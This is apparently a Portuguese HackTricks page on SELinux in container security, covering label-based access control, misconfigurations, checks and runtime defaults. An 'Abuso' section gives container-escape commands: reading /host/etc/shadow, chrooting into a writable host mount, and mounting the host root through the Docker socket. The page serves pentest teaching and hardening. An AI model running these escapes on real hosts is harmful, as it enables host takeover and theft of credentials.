# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux é um sistema de **Controle de Acesso Mandatório baseado em rótulos**. Todo processo e objeto relevante pode carregar um contexto de segurança, e a política decide quais domínios podem interagir com quais tipos e de que maneira. Em ambientes conteinerizados, isso normalmente significa que o runtime lança o processo do contêiner sob um domínio de contêiner confinado e rotula o conteúdo do contêiner com os tipos correspondentes. Se a política estiver funcionando corretamente, o processo poderá ler e escrever o que seu rótulo deve acessar enquanto tem o acesso a outros conteúdos do host negado, mesmo que esse conteúdo fique visível por um ponto de montagem.

Este é um dos mecanismos de proteção do lado do host mais poderosos disponíveis em implantações de contêiner Linux comuns. É especialmente importante no Fedora, RHEL, CentOS Stream, OpenShift e outros ecossistemas centrados em SELinux. Nesses ambientes, um revisor que ignora o SELinux frequentemente compreenderá mal por que um caminho que parece óbvio para comprometer o host está, na verdade, bloqueado.

## AppArmor Vs SELinux

A diferença de alto nível mais simples é que o AppArmor é baseado em caminho enquanto o SELinux é **baseado em rótulos**. Isso tem grandes consequências para a segurança de contêineres. Uma política baseada em caminho pode se comportar de forma diferente se o mesmo conteúdo do host ficar visível sob um caminho de montagem inesperado. Uma política baseada em rótulos, por outro lado, pergunta qual é o rótulo do objeto e o que o domínio do processo pode fazer com ele. Isso não torna o SELinux simples, mas o torna robusto contra uma classe de suposições envolvendo truques com caminhos que os defensores às vezes cometem acidentalmente em sistemas baseados em AppArmor.

Como o modelo é orientado por rótulos, o tratamento de volumes de contêiner e as decisões de rerotulagem são críticas para a segurança. Se o runtime ou o operador alterar rótulos de forma ampla demais para "fazer os pontos de montagem funcionarem", a fronteira de política que deveria conter a carga de trabalho pode ficar muito mais fraca do que o pretendido.

## Lab

Para verificar se o SELinux está ativo no host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspecionar os rótulos existentes no host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar uma execução normal com outra em que a rotulagem está desativada:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Em um host com SELinux habilitado, isto é uma demonstração muito prática porque mostra a diferença entre uma carga de trabalho rodando no domínio de container esperado e outra que foi desprovida dessa camada de aplicação.

## Uso em tempo de execução

Podman está particularmente bem alinhado com SELinux em sistemas onde o SELinux faz parte da configuração padrão da plataforma. Rootless Podman mais SELinux é uma das bases de container mais sólidas do mainstream porque o processo já é não-privilegiado no lado do host e ainda fica confinado por política MAC. Docker também pode usar SELinux onde suportado, embora administradores às vezes o desativem para contornar atritos na rotulagem de volumes. CRI-O e OpenShift dependem fortemente do SELinux como parte da sua estratégia de isolamento de containers. Kubernetes também pode expor configurações relacionadas ao SELinux, mas o valor delas obviamente depende de o sistema operacional do nó realmente suportar e impor o SELinux.

A lição recorrente é que SELinux não é um enfeite opcional. Nos ecossistemas construídos ao seu redor, ele faz parte da fronteira de segurança esperada.

## Misconfigurações

O erro clássico é `label=disable`. Operacionalmente, isso muitas vezes ocorre porque um mount de volume foi negado e a resposta mais rápida no curto prazo foi remover o SELinux da equação em vez de consertar o modelo de rotulagem. Outro erro comum é a relabelagem incorreta do conteúdo do host. Operações amplas de relabel podem fazer a aplicação funcionar, mas também podem expandir o que o container tem permissão para tocar muito além do originalmente pretendido.

Também é importante não confundir o SELinux **instalado** com o SELinux **efetivo**. Um host pode suportar SELinux e ainda estar em modo permissivo, ou o runtime pode não estar iniciando a carga de trabalho sob o domínio esperado. Nesses casos a proteção é muito mais fraca do que a documentação pode sugerir.

## Abuso

Quando o SELinux está ausente, em permissive, ou amplamente desativado para a carga de trabalho, caminhos montados do host ficam muito mais fáceis de abusar. O mesmo bind mount que de outra forma teria sido restringido por rótulos pode se tornar uma via direta para dados do host ou para modificação do host. Isso é especialmente relevante quando combinado com mounts de volume graváveis, diretórios do runtime do container ou atalhos operacionais que expuseram caminhos sensíveis do host por conveniência.

O SELinux frequentemente explica por que um writeup genérico de breakout funciona imediatamente em um host mas falha repetidamente em outro, mesmo que as flags do runtime pareçam semelhantes. O ingrediente ausente frequentemente não é um namespace ou uma capability, mas uma fronteira de rótulos que permaneceu intacta.

A verificação prática mais rápida é comparar o contexto ativo e então sondar caminhos montados do host ou diretórios do runtime que normalmente seriam confinados por rótulos:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se um host bind mount estiver presente e a rotulagem do SELinux tiver sido desativada ou enfraquecida, a exposição de informações muitas vezes ocorre primeiro:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se o mount for gravável e o container for efetivamente host-root do ponto de vista do kernel, o próximo passo é testar uma modificação controlada no host em vez de adivinhar:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Em hosts com suporte a SELinux, a perda de rótulos em diretórios de estado em tempo de execução também pode expor caminhos diretos de privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Esses comandos não substituem uma full escape chain, mas deixam muito claro muito rapidamente se SELinux era o que estava impedindo o acesso a dados do host ou a modificação de arquivos no host.

### Exemplo completo: SELinux desabilitado + host montado como gravável

Se SELinux labeling estiver desabilitado e o filesystem do host estiver montado como gravável em `/host`, um full host escape torna-se um caso normal de bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se o `chroot` for bem-sucedido, o processo do container agora está operando a partir do sistema de arquivos do host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemplo Completo: SELinux Desativado + Runtime Directory

Se a workload conseguir alcançar um runtime socket uma vez que os labels estiverem desabilitados, o escape pode ser delegado para o runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
A observação relevante é que SELinux frequentemente era o controle que impedia exatamente esse tipo de acesso host-path ou runtime-state.

## Verificações

O objetivo das verificações do SELinux é confirmar que SELinux está habilitado, identificar o contexto de segurança atual e verificar se os arquivos ou caminhos que lhe interessam estão de fato confinados por rótulo.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
O que é interessante aqui:

- `getenforce` idealmente deve retornar `Enforcing`; `Permissive` ou `Disabled` mudam o significado de toda a seção SELinux.
- Se o contexto do processo atual parecer inesperado ou muito amplo, o workload pode não estar sendo executado sob a política de container pretendida.
- Se host-mounted files ou runtime directories tiverem labels que o processo possa acessar com muita liberdade, bind mounts tornam-se muito mais perigosos.

Ao revisar um container em uma plataforma com suporte a SELinux, não trate labeling como um detalhe secundário. Em muitos casos é uma das principais razões pelas quais o host ainda não foi comprometido.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | weak or broad `seLinuxOptions`, running on permissive/disabled nodes, platform policies that disable labeling |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |

SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.
